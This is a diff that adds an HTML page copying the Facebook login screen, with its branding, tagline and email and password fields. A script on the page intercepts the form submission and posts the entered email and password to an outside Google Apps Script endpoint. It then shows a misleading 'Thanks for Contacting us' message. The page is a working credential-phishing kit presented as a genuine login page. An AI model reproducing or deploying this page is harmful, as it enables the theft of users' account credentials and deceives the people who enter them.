@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Your Account</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container flex">
+        <div class="facebook-page flex">
+          <div class="text">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world </p>
+            <p> around you on Facebook.</p>
+          </div>
+          <form method="POST" name="Facebook">
+            <input type="email" name="Email" placeholder="Email or phone number" required>
+            <input type="password" name="Password" placeholder="Password" required>
+            <div class="link">
+              <button type="submit" class="login">Login</button>
+              <a href="#" class="forgot">Forgot password?</a>
+            </div>
+            <hr>
+            <div class="button">
+              <a href="/">Create new account</a>
+            </div>
+          </form>
+        </div>
+      </div>
+
+
+
+      <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwBuNh-g24geEBt_uCGruAYEymq08NqAvDNJAp1XMmyEUDcCJV7QNMpbkCVHbuKVs_D/exec'
+        const form = document.forms['Facebook']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+</body>
+</html>
